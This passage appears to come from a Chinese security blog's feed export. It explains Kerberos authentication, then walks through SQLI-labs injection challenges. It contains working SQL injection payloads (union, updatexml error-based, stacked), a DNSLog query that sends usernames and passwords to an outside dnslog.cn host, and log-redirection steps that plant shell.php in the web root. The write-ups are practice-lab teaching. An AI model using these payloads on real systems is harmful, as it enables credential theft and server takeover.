Granting Ticket)票给 Client。</p><blockquote><p>Ticket Granting Server:</p></blockquote><p>TGS 的作用就是通过 AS 发给 Client 的票(TGT)换取访问 Server</p><p>端的票 ST(Server Ticket)。ST 也有资料称之为 TGS Ticket。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/02.png" alt="Kerberos 协议框架"></p><h2 id="Kerberos-认证流程"><a href="#Kerberos-认证流程" class="headerlink" title="Kerberos 认证流程"></a>Kerberos 认证流程</h2><p>当 Client 想要访问 Server 上的某个服务时，需要先向 AS 证明自己的身份，然后通过 AS 发放的 TGT 向 Server 发起认证请求，这个过程分为三块:</p><ul><li>The Authentication Service Exchange: Client 与 AS 的交互</li><li>The Ticket Granting Service Exchange:Client 与 TGS 的交互</li><li>The Client/Server Authentication Exchange:Client 与 Server 的交互</li></ul><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/03.png" alt="Kerberos 认证流程"></p><h4 id="1-The-Authentication-Service-Exchange"><a href="#1-The-Authentication-Service-Exchange" class="headerlink" title="(1) The Authentication Service Exchange"></a>(1) The Authentication Service Exchange</h4><h5 id="KRB-AS-REQ"><a href="#KRB-AS-REQ" class="headerlink" title="KRB_AS_REQ:"></a>KRB_AS_REQ:</h5><blockquote><p>Client-&gt;AS:发送 Authenticator1(Client 密码加密 TimeStamp)</p></blockquote><p>第一步 Client 先向 KDC 的 AS 发送 Authenticator1,内容为通过 Client 密码 hash 加密的时间戳、Client ID、网络地址、加密类型等内容。</p><h5 id="KBR-AS-REP"><a href="#KBR-AS-REP" class="headerlink" title="KBR_AS_REP:"></a>KBR_AS_REP:</h5><blockquote><p>AS-&gt;Client:发送 Client 密码加密的 sessionkey-as 和票据 TGT(KBRTGT HASH 加密的 sesionkey-as 和 Timestamp)</p></blockquote><p>在 KDC 中存储了域中所有用户的密码 hash，当 AS 接受到 Client 的请求后会根据 KDC 中存储的密码来解密，解密成功并且验证信息。验证成功后返回给 Client 由 Client 密码 hash 加密的 sessionkey-as 和 TGT(由 KBRTGT HASH 加密的 sessionkey-as 和 Timestamp 等信 息)。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/04.png" alt="The Authentication Service Exchange"></p><h4 id="2-The-Ticket-Granting-Service-TGS-Exchange"><a href="#2-The-Ticket-Granting-Service-TGS-Exchange" class="headerlink" title="(2) The Ticket Granting Service(TGS) Exchange"></a>(2) The Ticket Granting Service(TGS) Exchange</h4><h5 id="KBR-TGS-REQ"><a href="#KBR-TGS-REQ" class="headerlink" title="KBR_TGS_REQ:"></a>KBR_TGS_REQ:</h5><blockquote><p>Client-&gt;TGS 发送 Authenticator2(sessionkey-as 加密 timestamp)和票据 TGT(KBRTGT HASH 加密的 sessionkey-as 和 timestamp)</p></blockquote><p>Client 接收到了加密的 sessionkey-as 和 TGT 后，用自身的密码解密得到 sessionkey-as， TGT 是 KDC 密码加密的，Client 无法解密。这时 Client 再用 sessionkey-as 加密 timestamp 和 TGT 一起发送给 KDC 中的 TGS(Ticket Granting Server)票据授权服务器换取能够访问 Server 的票据。</p><h5 id="KBR-TGS-REP"><a href="#KBR-TGS-REP" class="headerlink" title="KBR_TGS-REP:"></a>KBR_TGS-REP:</h5><blockquote><p>TGS-&gt;Client:发送密文(由 sessionkey-as 加密的 sessionkey-tgs)和票据 ST(由 server 密 码 hash 加密的 sessionkey-tgs)</p></blockquote><p>TGS 收到 Client 发送过来的 TGT 和 Sessionkey-as 加密的 TimeStamp 之后，首先会检 查自身是否存在 Client 所请求的服务。如果服务存在，则用 KRBTGT 密码解密 TGT。一般情 况下 TGS 会检查 TGT 中的时间戳查看 TGT 是否过期，且原始地址是否和 TGT 中保存的地址 相同。验证成功之后将用 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 Sessionkey-tgs 发送给 Client。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/05.png" alt="The Ticket Granting Service(TGS) Exchange"></p><h4 id="3-The-Client-Server-Authentication-Exchange"><a href="#3-The-Client-Server-Authentication-Exchange" class="headerlink" title="(3) The Client/Server Authentication Exchange"></a>(3) The Client/Server Authentication Exchange</h4><h5 id="KBR-AP-REQ"><a href="#KBR-AP-REQ" class="headerlink" title="KBR_AP_REQ:"></a>KBR_AP_REQ:</h5><blockquote><p>Client-&gt;Server 发送 Authenticator3(sessionkey-tgs 加密 timestamp)和票据 ST(Server 密码 hash 加密的 sessionkey-tgs)</p></blockquote><p>Client 收到 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 hash 加密的 sessionkey- tgs 之后用 sessionkey-as 解密得到 sessionkey-tgs，然后把 sessionkey-tgs 加密的 timestamp 和 ST 一起发送给 Server。</p><h5 id="KBR-AP-REP"><a href="#KBR-AP-REP" class="headerlink" title="KBR_AP_REP:"></a>KBR_AP_REP:</h5><blockquote><p>Server-&gt;Client :</p></blockquote><p>Server 通过自己的密码解密 ST，得到 sessionkey-tgs，再用 sessionkey-tgs 解密 Authenticator3 得到 timestamp，验证正确返回验证成功。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/06.png" alt="The Client/Server Authentication Exchange"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Kerberos-协议简介&quot;&gt;&lt;a href=&quot;#Kerberos-协议简介&quot; class=&quot;headerlink&quot; title=&quot;Kerberos 协议简介&quot;&gt;&lt;/a&gt;Kerberos 协议简介&lt;/h2&gt;&lt;p&gt;Kerberos 是一种网络认证协议，其设计目标是通</summary>
      
    
    
    
    <category term="内网渗透" scheme="http://www.secice.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="域渗透" scheme="http://www.secice.cn/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>SQLI labs 靶场笔记之进阶挑战 54-65 关</title>
    <link href="http://www.secice.cn/p/32046ada"/>
    <id>http://www.secice.cn/p/32046ada</id>
    <published>2020-07-23T07:41:04.000Z</published>
    <updated>2020-12-11T01:43:59.531Z</updated>
    
    <content type="html"><![CDATA[<h1 id="进阶挑战-54-65-关"><a href="#进阶挑战-54-65-关" class="headerlink" title="进阶挑战 54-65 关"></a>进阶挑战 54-65 关</h1><h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>简单源码分析：</p><pre><code class="hljs Php"><span class="hljs-keyword">if</span> reset:    <span class="hljs-comment"># 根据时间戳生成 cookie</span>    setcookie(<span class="hljs-string">&#x27;challenge&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, time() - <span class="hljs-number">3600000</span>);<span class="hljs-keyword">else</span>:    <span class="hljs-keyword">if</span> cookie 中有 challenge:        <span class="hljs-variable">$sessid</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;challenge&#x27;</span>];    <span class="hljs-keyword">else</span>:        <span class="hljs-comment"># 生成 cookie </span>        <span class="hljs-variable">$expire</span> = time()+<span class="hljs-number">60</span>*<span class="hljs-number">60</span>*<span class="hljs-number">24</span>*<span class="hljs-number">30</span>;        <span class="hljs-variable">$hash</span> = data(<span class="hljs-variable">$table</span>,<span class="hljs-variable">$col</span>);        setcookie(<span class="hljs-string">&quot;challenge&quot;</span>, <span class="hljs-variable">$hash</span>, <span class="hljs-variable">$expire</span>);    <span class="hljs-keyword">if</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]:        计数器 + <span class="hljs-number">1</span>        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;    <span class="hljs-keyword">if</span> 有查询成功:        输出查询信息    <span class="hljs-keyword">else</span>：        啥都不输出<span class="hljs-comment"># key 被双重过滤了</span><span class="hljs-variable">$key</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>]);<span class="hljs-variable">$key</span> = mysql_real_escape_string(<span class="hljs-variable">$key</span>);<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT 1 FROM <span class="hljs-subst">$table</span> WHERE <span class="hljs-subst">$col1</span>= &#x27;<span class="hljs-subst">$key</span>&#x27;&quot;</span>;</code></pre><p>代码中可以分享出，得让我们在 10 次注入测试中拿到 key 值。看了源码可以直接联合查询，10 次以内拿到 key 感觉问题不大，那么尝试看看吧：</p><p><strong>判断闭合方式</strong></p><pre><code class="hljs sql">?id=1&#x27;<span class="hljs-comment">--+</span></code></pre><p><strong>判断字段数</strong></p><pre><code class="hljs sql">?id=1&#x27; order by 3<span class="hljs-comment">--+</span>?id=1&#x27; order by 4<span class="hljs-comment">--+</span></code></pre><p><strong>查询有可注入的字段</strong></p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p>字段数 2,3</p><p><strong>查询表名</strong></p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()) <span class="hljs-comment">--+</span></code></pre><p>表名为：<code>bplubnri6m</code>，这个表名可能是随机的 不同用户不一样</p><p><strong>查询列名</strong></p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;bplubnri6m&#x27;</span>) <span class="hljs-comment">--+</span></code></pre><p>查到列名如下：id,sessid,secret_0UH9,tryy</p><p><strong>查询字段值</strong></p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(secret_0UH9) <span class="hljs-keyword">from</span> bplubnri6m) <span class="hljs-comment">--+</span></code></pre><p>拿到 key 值为：Vbf3WpKCBvu8s4rnCTEeWcPa</p><p>总共只需要 6 步，其中在判断字段数这里有不确定性，理论上 10 步以内是可以正常注入出来的。</p><h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=($id)</code></td></tr></tbody></table><p>Less-55 给了 14 次尝试机会，代码基本上没有变化，只是闭合方式发生了变化，这里不再赘述。</p><h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54</p><h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54</p><h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>Less-58 这里相比较于 Less-54 - Less-57 变化还是比较大的，主要有明显区别的代码如下：</p><pre><code class="hljs Php"><span class="hljs-variable">$unames</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Dumb&quot;</span>,<span class="hljs-string">&quot;Angelina&quot;</span>,<span class="hljs-string">&quot;Dummy&quot;</span>,<span class="hljs-string">&quot;secure&quot;</span>,<span class="hljs-string">&quot;stupid&quot;</span>,<span class="hljs-string">&quot;superman&quot;</span>,<span class="hljs-string">&quot;batman&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin1&quot;</span>,<span class="hljs-string">&quot;admin2&quot;</span>,<span class="hljs-string">&quot;admin3&quot;</span>,<span class="hljs-string">&quot;dhakkan&quot;</span>,<span class="hljs-string">&quot;admin4&quot;</span>);<span class="hljs-variable">$pass</span> = (<span class="hljs-variable">$unames</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Login name : &#x27;</span>. <span class="hljs-variable">$unames</span>[<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]];<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Password : &#x27;</span> .<span class="hljs-variable">$pass</span>[<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]];</code></pre><p>因为这里输出只输出 <code>$unames</code> 和 <code>$pass</code> 数组，pass 数组就是 unames 数组的逆序，所以这里使用联合查询的话是没有效果的，输出不了有用的信息。天无绝人之路，但是下面输出：</p><pre><code class="hljs php">print_r(mysql_error());</code></pre><p>所以这里就可以进行报错注入，下面直接丢 payload 吧：</p><pre><code class="hljs sql">?id=1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ </span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>k4xoowbia1<span class="hljs-string">&#x27;),0x7e),1)--+ </span><span class="hljs-string"></span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(secret_D5OR) <span class="hljs-keyword">from</span> k4xoowbia1),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ </span></code></pre><p>这里我注入的表名为：<code>k4xoowbia1</code>，列名为：<code>secret_D5OR</code></p><h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p>与 Less-58 的思路一样，只是拼接方式不一样，详见 Less-58</p><h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=（&quot;$id&quot;）</code></td></tr></tbody></table><p>与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58</p><h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=((&#39;$id&#39;))</code></td></tr></tbody></table><p>与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58</p><h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>此时报错也取消了，这里只能进行布尔盲注或者延时盲注了，对于盲注强烈建议使用脚本，人工太慢，在实战工程中还是靠 sqlmap 这种自动化注入神器或者自己写脚本了，手工注入的话岂不是得天荒地老。</p><h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p><h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=(($id))</code></td></tr></tbody></table><p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p><h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=(&quot;$id&quot;)</code></td></tr></tbody></table><p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.sqlsec.com/2020/05/sqlilabs.html">国光的SQLI labs 靶场精简学习记录</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;进阶挑战-54-65-关&quot;&gt;&lt;a href=&quot;#进阶挑战-54-65-关&quot; class=&quot;headerlink&quot; title=&quot;进阶挑战 54-65 关&quot;&gt;&lt;/a&gt;进阶挑战 54-65 关&lt;/h1&gt;&lt;h2 id=&quot;Less-54&quot;&gt;&lt;a href=&quot;#Less-5</summary>
      
    
    
    
    <category term="SQL注入" scheme="http://www.secice.cn/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="SQL注入" scheme="http://www.secice.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli lab" scheme="http://www.secice.cn/tags/sqli-lab/"/>
    
  </entry>
  
  <entry>
    <title>SQLI labs 靶场笔记之堆叠注入 38-53 关</title>
    <link href="http://www.secice.cn/p/1f400290"/>
    <id>http://www.secice.cn/p/1f400290</id>
    <published>2020-07-22T12:10:24.000Z</published>
    <updated>2020-12-13T11:12:33.873Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆叠注入-38-53-关"><a href="#堆叠注入-38-53-关" class="headerlink" title="堆叠注入 38-53 关"></a>堆叠注入 38-53 关</h1><h2 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h2><p>MySQL 的命令行中，每一条语句以<code>;</code>结尾，这代表语句的结束，如果在注入过程中在<code>;</code>后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。下面就是简单的示例：</p><pre><code class="hljs sql">mysql&gt; select * from users where id = 1;select version();+<span class="hljs-comment">----+----------+----------+</span>| id | username | password |+<span class="hljs-comment">----+----------+----------+</span>|  1 | Dumb     | Dumb     |+<span class="hljs-comment">----+----------+----------+</span>1 row in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)+<span class="hljs-comment">-----------+</span>| <span class="hljs-keyword">version</span>() |+<span class="hljs-comment">-----------+</span>| <span class="hljs-number">8.0</span><span class="hljs-number">.12</span>    |+<span class="hljs-comment">-----------+</span><span class="hljs-number">1</span> <span class="hljs-keyword">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)</code></pre><p>与 union select 联合查询相比，堆叠查询更加灵活，可以执行任意的 SQL 语句。</p><h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><ol><li>并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。</li><li>在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略</li></ol><p>这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等</p><h3 id="各个数据库堆叠查询实例"><a href="#各个数据库堆叠查询实例" class="headerlink" title="各个数据库堆叠查询实例"></a>各个数据库堆叠查询实例</h3><p><strong>MySQL</strong></p><pre><code class="hljs Sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span>;<span class="hljs-keyword">select</span> <span class="hljs-keyword">version</span>();</code></pre><p><strong>SQL Server</strong></p><pre><code class="hljs Mssql">select 1,2,3;select * from test;</code></pre><p><strong>Postgresql</strong></p><pre><code class="hljs Sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> user_test;<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;</code></pre><p>注入天书里面说 Oracle 不支持堆叠查询。</p><h2 id="Less-38-堆叠注入"><a href="#Less-38-堆叠注入" class="headerlink" title="Less-38(堆叠注入)"></a>Less-38(堆叠注入)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>又到了源码简单分析的时间了，来看看堆叠注入的代码是如何实现的：</p><pre><code class="hljs Php"><span class="hljs-comment"># id 参数直接带入到 SQL 语句中</span><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> (mysqli_multi_query(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>)):    输出查询信息<span class="hljs-keyword">else</span>:    print_r(mysqli_error(<span class="hljs-variable">$con1</span>));</code></pre><p>发现和之前的关卡区别不大，唯一的区别就是查询 SQL 语句由原来的：</p><pre><code class="hljs Php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-variable">$result</span>=mysql_query(<span class="hljs-variable">$sql</span>);</code></pre><p>变成了现在的：</p><pre><code class="hljs Php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> (mysqli_multi_query(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))</code></pre><p><code>mysqli_multi_query</code> 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。</p><p>既然知道原理了 那么这一关就详细演示一下这个堆叠注入如何灵活使用：</p><p><strong>添加字段值</strong></p><pre><code class="hljs sql">?id=1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span>(username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-string">&#x27;world&#x27;</span>);</code></pre><p>数据库中查看是否添加成功：</p><pre><code class="hljs sql">mysql&gt; select * from users where username=&#x27;hello&#x27;;+<span class="hljs-comment">----+----------+----------+</span>| id | username | password |+<span class="hljs-comment">----+----------+----------+</span>| 15 | hello    | world    |+<span class="hljs-comment">----+----------+----------+</span>1 row in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)</code></pre><p>但是这个貌似并没有什么作用，但是注入天书里面也没有说其他的姿势，实际上看到这里的人应该明白后面是可以执行任意 SQL 语句的，那么这个怎么进行漏洞利用的话 就完全看你的想象力了，接下来演示我认为比较实用的姿势。</p><h3 id="DNSLog-数据外带"><a href="#DNSLog-数据外带" class="headerlink" title="DNSLog 数据外带"></a>DNSLog 数据外带</h3><p>需要条件：</p><ol><li>MySQL 开启 load_file()</li><li>DNSLog 平台 （<a href="http://dnslog.cn/">dnslog</a>、<a href="http://ceye.io/">CEYE</a>）</li><li>Windows 平台</li></ol><p><code>load_file</code> 函数在 Linux 下是无法用来做 DNSLog 攻击的，因为在这里就涉及到 Windows 的 UNC 路径。</p><p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p><pre><code class="hljs bash">\\192.168.31.53\<span class="hljs-built_in">test</span>\</code></pre><p><code>CONCAT()</code> 函数拼接了4个<code>\</code>了，因为转义的原因，4个就变<code>\</code>成了2个<code>\</code>，目的就是利用 UNC 路径。</p><p>因为 Linux 没有 UNC 路径这个东西，所以当 MySQL 处于 Linux 系统中的时候，是不能使用这种方式外带数据的。</p><p>下面使用 Windows 下的 sqli-labs 测试环境：</p><pre><code class="hljs sql">?id=1&#x27;;<span class="hljs-keyword">select</span> <span class="hljs-keyword">load_file</span>(<span class="hljs-keyword">concat</span>(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;:&#x27;</span>,username,<span class="hljs-keyword">password</span>)) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;.952nzx.dnslog.cn\\abc&#x27;</span>))<span class="hljs-comment">--+</span></code></pre><p>Hex 编码的目的就是减少干扰，因为域名是有一定的规范，有些特殊符号是不能带入的有。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/01.png" alt="Less-38_DNSLog 数据外带"></p><p>手动 Hex 解码即可</p><h3 id="开启日志-Getshell"><a href="#开启日志-Getshell" class="headerlink" title="开启日志 Getshell"></a>开启日志 Getshell</h3><p>需要条件：</p><ol><li>Web 的物理路径</li><li>MySQL 可以读写 Web 目录</li><li>Windows 成功率 高于 Linux</li></ol><p>首先查看当前的日志的相关配置：</p><pre><code class="hljs sql">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;+<span class="hljs-comment">------------------+-----------------------------------------------------------------+</span>| Variable_name    | Value                                                           |+<span class="hljs-comment">------------------+-----------------------------------------------------------------+</span>| general_log      | OFF                                                             || general_log_file | D:\phpstudy_pro\Extensions\MySQL8.0.12\data\DESKTOP-7FQSJGU.log |+<span class="hljs-comment">------------------+-----------------------------------------------------------------+</span>2 rows in <span class="hljs-keyword">set</span>, <span class="hljs-number">1</span> <span class="hljs-keyword">warning</span> (<span class="hljs-number">0.00</span> sec)</code></pre><p><code>general_log</code>环境默认是没有开启的，这里尝试注入的时候手动开启：</p><pre><code class="hljs sql">?id=1&#x27;;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-string">&quot;ON&quot;</span>;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;D:/phpstudy_pro/WWW/sqli.pl/Less-38/shell.php&#x27;</span>;<span class="hljs-comment">--+</span></code></pre><p>然后 MySQL 再查看日志配置是否被修改了：</p><pre><code class="hljs sql">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;+<span class="hljs-comment">------------------+-----------------------------------------------+</span>| Variable_name    | Value                                         |+<span class="hljs-comment">------------------+-----------------------------------------------+</span>| general_log      | ON                                            || general_log_file | D:/phpstudy_pro/WWW/sqli.pl/Less-38/shell.php |+<span class="hljs-comment">------------------+-----------------------------------------------+</span>2 rows in <span class="hljs-keyword">set</span>, 